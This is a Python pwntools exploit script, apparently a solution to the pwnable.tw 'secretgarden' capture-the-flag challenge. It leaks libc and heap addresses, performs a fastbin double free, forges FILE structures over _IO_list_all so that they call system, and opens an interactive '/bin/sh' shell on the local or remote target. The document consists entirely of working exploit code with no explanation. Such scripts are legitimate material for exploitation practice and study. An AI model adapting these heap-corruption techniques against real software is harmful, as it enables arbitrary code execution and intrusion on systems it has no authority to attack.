from pwn import *
import sys

l = ELF('./libc_64.so.6')

def alloc(length, name, color):
	p.sendafter("choice : ", "1")
	p.sendlineafter("name :", str(length))
	p.sendafter("flower :", name)
	p.sendlineafter("flower :", color)

def visit():
	p.sendafter("choice : ", "2")

def remove(idx):
	p.sendafter("choice : ", "3")
	p.sendlineafter("garden:", str(idx))

def clean():
	p.sendafter("choice : ", "4")

if len(sys.argv) == 1:
	p = process(["./secretgarden"],env={"LD_PRELOAD":"./libc_64.so.6"})
else:
	p = remote("chall.pwnable.tw", 10203)

# leak libc addr
alloc(0x90+0x30, "0000", "0000")
alloc(0x90, "1111", "1111")

remove(0)
alloc(0x90, "a"*8, "0000_1")
visit()
p.recvuntil("a"*8)
leak = u64(p.recvline()[:-1].ljust(8,"\x00"))
libc = leak - (0x7fcb0d414b78 - 0x00007fcb0d050000) + 0x1000
log.info("leak = {}".format(hex(leak)))
log.info("libc = {}".format(hex(libc)))

# leak heap addr
alloc(0x60, "3333", "3333")
alloc(0x60, "4444", "4444")
alloc(0x60, "5555", "5555")

remove(3)
remove(4)
alloc(0x60, "\x01", "\x01")
visit()
p.recvuntil("flower[6] :")
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
heap = leak + (0x560e535ec000 - 0x560e535ed201)
log.info("leak = {}".format(hex(leak)))
log.info("heap = {}".format(hex(heap)))
alloc(0x60, "7777", "7777")

# double free
malloc_hook = libc + 0x3c4b10 - 35
__exit_funcs = libc + 0x3c45f8 - 0x63 + 8
_IO_list_all = libc + 0x3c54fd + 0x23 - 0x1000
log.info("_IO_list_all = 0x%x" % _IO_list_all)
oneshot = libc + 0x45216
payload = p64(heap + 0x1210)
remove(5)
remove(7)
remove(5)
alloc(0x60, p64(_IO_list_all - 0x23), "8888")

log.info("system = 0x%x" % (libc + l.symbols['system']))
payload = p64(libc + l.symbols['system']) * 8
alloc(0x60, "9"*8, "9999")
alloc(0x60, payload, "1111")

payload = "\x00"*19
payload += p64(heap + 0x1520)
alloc(0x60, payload, "dddd")

payload = "/bin/sh\x00"
payload += p64(0) * 3
payload += p64(0) + p64(1)
payload = payload.ljust(0xd8, "\x00")
payload += p64(heap + 0x1360)
alloc(0x100, payload, "eeee")

p.sendlineafter("choice : ", "5")
p.interactive()
